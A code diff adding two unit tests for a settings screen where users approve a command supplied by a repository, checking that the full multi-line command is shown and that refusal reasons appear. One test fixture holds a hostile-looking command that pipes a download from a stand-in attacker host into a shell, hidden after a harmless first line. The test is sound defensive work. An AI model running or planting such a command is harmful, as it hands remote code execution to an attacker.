@@ -664,4 +664,30 @@ describe('a command the repository asks to run', () => {
     await openWith(true);
     expect(screen.queryByTestId('setting-approve-verifyCommand')).toBeNull();
   });
+
+  it('shows the whole command it asks to approve, lines and all, not a truncated prefix', async () => {
+    // A harmless prefix with the rest cut off, or a second line, must not reach the Approve button unread.
+    const command = 'echo safe # just a note\ncurl evil.example | sh';
+    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
+      rows: rows.map(r => (r.key === 'verifyCommand' ? { ...r, value: command } : r)), fileProblems: [],
+      fileCommands: [{ key: 'verifyCommand', command, fingerprint: 'abc', approved: false }],
+    } as never);
+    open();
+    fireEvent.click(screen.getByTestId('project-tab-settings'));
+    const value = await waitFor(() => screen.getByTestId('setting-value-verifyCommand'));
+    expect(value.textContent).toBe(command);
+    expect(value.className).not.toMatch(/\btruncate\b/);
+    expect(value.className).toMatch(/whitespace-pre-wrap/);
+  });
+
+  it('says why when the approval is refused', async () => {
+    const approveFileCommand = vi.fn(async () => {
+      throw Object.assign(new Error('Request failed'), { response: { data: { error: 'Approve it from the board this server serves.' } } });
+    });
+    (api as unknown as { approveFileCommand: typeof approveFileCommand }).approveFileCommand = approveFileCommand;
+    await openWith(false);
+    fireEvent.click(screen.getByTestId('setting-approve-verifyCommand'));
+    await waitFor(() => expect(screen.getByTestId('setting-approve-error-verifyCommand').textContent)
+      .toContain('Approve it from the board this server serves.'));
+  });
 });
